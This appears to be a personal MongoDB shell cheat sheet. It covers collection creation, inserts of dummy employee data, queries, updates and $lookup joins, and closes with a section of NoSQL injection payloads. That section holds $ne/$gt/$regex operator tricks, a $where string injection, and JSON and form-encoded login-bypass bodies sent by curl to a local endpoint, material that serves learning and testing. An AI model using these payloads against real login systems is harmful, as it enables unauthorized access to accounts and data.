#list db
show dbs

#create/set current db
use superstore

#list collections (tables)
show collections
db.getCollectionNames()

#create collection
db.createCollection('employee')		#explicit
#db.employee.insert(...)		#implicit create collection/insert data

#drop collection
db.employee.drop()

#add document(data entry) (check if employee collection exist, if not create, and insert data)
db.employee.insert([
{
"name" : {"last": "scott", "first": "jill"},
"sex":"F",
"age" : 65,
"address" : "111, rrr, rf, 34343",
"position" : "bouncer",
},
{ 
"name" : {"last": "late", "first": "bob"},
"sex":"M",
"age" : 34,
"address" : "454 rrrr, tr, 23233",
"position" : "guard",
},
{ 
"name" : {"last": "hope", "first": "alice"},
"sex":"F",
"age" : 23,
"address" : "66, trt, ww, 34343",
"position" : "bar",
},

])

#list employee collection's documents
db.employee.find()			#list all
db.employee.find({"name.first": "jill"})				#list employee with first name jill (return all fileds)
db.employee.find({'name.first': 'jill'}, {"sex":1,"age":1})		#return employee sex and age with first name = jill
db.employee.find({'age': {$lt: 50}}, {"name.first":1, "name.last":1})	#return employee first/last name with age < 50
db.employee.update({'name.first':'jill'}, {$set: {'address':'4454 lefty DR, longing, AL, 44445'}})
									#update employee address with first name = jill (without $set everything will be update to 'address')
db.employee.update({'name.first':'bob'}, {$set: {'address':'4445 righty DR, longing, AL, 44444'}})
db.employee.update({'name.first':'alice'}, {$set: {'address':'6666 center DR, longing, AL, 9999'}})
db.employee.find({'address': {$regex: /AL.+?444/}})			#query regex address in state AL with leading 444 zip
db.employee.remove({'name.first': 'bob'})				#remove document with first name bob

#add salary collection
db.salary.insert([
{
'position': 'bouncer',
'salary': 1000,
},
{
'position': 'bar',
'salary': 2000,
},
{
'position': 'guard',
'salary': 700,
},
])

#join employee and salary(as pay) on position, return name.first, pay.salary
db.employee.aggregate( { $lookup: { from: 'salary', localField: 'position', foreignField: 'position', as:'pay' } }, { $project: { 'name.first': 1, 'pay.salary':1 } } )

#some noSQLI
#passing obj
var ne = {$ne: null}
db.salary.find( {'salary': ne} )				#get salary != null

var ne = {$ne: "1"}
db.salary.find( {'position': ne} )

var gt = {$gt: ""}
db.salary.find( {'position': gt} )				#anything with non empty position

db.users.find({ name: {$in: ["rrrr", "user"]}})			#name match anything in array

db.customers.find({name: {$regex:/^b../} })

db.customers.find( {$or: db.customers.find({name:{$regex:/^b../}}, {name:1, _id:0}).toArray()} )

db.users.find({ $and: [{name: "admin"}, {password:"pass1234"}] })

#$where
var inject = "0||1==1"						#user control input
#var inject = "0;return true"						#works too
var query = "this.salary == " + inject				#build query use with $where
db.salary.find( {$where: query} )					#$where will eval the string ()
db.users.find({$where: 'this.password == "pass1234"'})

#POST/GET
content-type: application/json **works
{"login":"admin","pass":{"$ne":null},"submit":"Login!"}
{"login":"admin","pass":{"$gt":""},"submit":"Login!"
{"login":"admin","pass":{"$ne":"1"},"submit":"Login!"}
{"name":{"$gt":""}}
{"name":{"$gt":1}}
{"name":{"$ne":null}}
{"name":{"$regex":"a...."}}		**blind injection in find(query)

curl http://127.0.0.1:8080/login -H "Content-Type: application/json" -d '{"name":{"$gt":""}}' -i

Content-Type: application/x-www-form-urlencoded **works too
[name][$gt]=
[name][$gt]=1
[name][$ne]=
[name][$regex]=a....
